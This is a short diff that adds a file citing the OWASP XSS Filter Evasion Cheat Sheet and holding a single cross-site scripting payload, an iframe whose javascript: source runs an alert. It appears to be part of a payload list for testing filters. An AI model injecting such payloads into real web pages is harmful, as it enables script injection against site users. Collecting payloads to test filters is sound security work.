@@ -1,0 +1,4 @@
+Sourcec: https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html
+
+#Simple XSS using iframe
+<iframe src="javascript:alert(`xss`)"> 
